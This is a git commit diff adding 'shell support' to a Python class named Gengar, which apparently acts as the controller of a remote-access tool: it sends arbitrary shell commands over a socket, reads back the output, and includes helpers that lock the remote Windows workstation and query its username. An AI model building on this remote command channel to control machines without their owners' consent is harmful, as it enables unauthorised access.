d62c40a62bd08cfb9888c7afafbe1b9e988d01c2
Elon Gliksberg <elongliks@gmail.com>
2020-02-11 22:43:42 +0200

    Added shell support.

--- gengar.py
+++ gengar.py
@@ -1,16 +1,21 @@
+class CommandTypes:
+    SHELL = b'\x00'
+
+
 class Gengar:
     def __init__(self, sock):
         self._sock = sock
 
     def shell(self, cmd):
-        pass
+        self._sock.send(CommandTypes.SHELL + cmd.encode())
+        return self._sock.recv(8192).decode()
 
     def lock_workstation(self):
         print('Locking workstation')
         self.shell('rundll32 user32.dll,LockWorkStation')
 
     def username(self):
-        return self.shell('echo %username%')
+        return self.shell(r'echo %username%')
 
     def is_alive(self):
         try:
